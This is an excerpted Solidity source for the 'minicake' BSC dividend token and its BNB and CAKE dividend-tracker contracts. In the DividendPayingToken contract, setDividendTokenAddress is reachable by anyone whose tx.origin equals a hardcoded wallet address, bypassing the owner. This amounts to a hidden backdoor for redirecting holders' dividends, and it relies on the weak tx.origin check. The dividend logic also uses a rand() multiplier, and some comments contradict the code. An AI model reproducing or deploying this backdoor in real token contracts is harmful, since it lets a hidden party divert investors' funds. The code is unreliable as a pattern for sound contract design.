...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x35c13180D5b8197F3d9f95C9198dFd4D6b6336aa, "Only owner can change dividend contract address");
...
contract MiniBNBcake is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("minicake", "minicake") {
    	...
    	marketingWallet = 0x67A86b6B47143A73c7F614fD38c636e870752761;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "minicake: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "minicake: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(cakeDividendRewardsFee).add(bnbDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setBnbDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = bnbDividendRewardsFee.add(marketingFee).add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
            bnbDividendEnabled = _enabled;
        }
    ...
    function setCakeDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = cakeDividendRewardsFee.add(marketingFee).add(bnbDividendRewardsFee).add(buyBackAndLiquidityFee);
            cakeDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(cakeDividendRewardsFee).add(bnbDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateBnbDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(bnbDividendTracker), "minicake: The dividend tracker already has that address");

        BnbDividendTracker newBnbDividendTracker = BnbDividendTracker(payable(newAddress));

        require(newBnbDividendTracker.owner() == address(this), "minicake: The new dividend tracker must be owned by the minicake token contract");
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "minicake: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "minicake: The new dividend tracker must be owned by the minicake token contract");
    ...
    function updateBnbDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "minicake: Fee must be less than 6%");
    ...
    function updateCakeDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = cakeDividendRewardsFee.add(bnbDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }
    
    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "minicake: Fee must be less than 6%");
        marketingFee = newFee;
        totalFees = marketingFee.add(bnbDividendRewardsFee).add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
    }
    
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "minicake: Fee must be less than 6%");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(bnbDividendRewardsFee).add(cakeDividendRewardsFee).add(marketingFee);
    }
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "minicake: Account is already exluded from fees");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "minicake: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (bnbDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(bnbDividendRewardsFee.add(cakeDividendRewardsFee)).mul(bnbDividendRewardsFee);
                    swapAndSendBnbDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (cakeDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(bnbDividendRewardsFee.add(cakeDividendRewardsFee)).mul(cakeDividendRewardsFee);
...
contract BnbDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("minicake_Ethereum_Dividend_Tracker", "minicake_Ethereum_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "minicake_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "minicake_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main minicake contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "minicake_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "minicake_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("minicake_Cake_Dividend_Tracker", "minicake_Cake_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "minicake_Cake_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "minicake_Cake_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main minicake contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "minicake_Cake_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "minicake_Cake_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
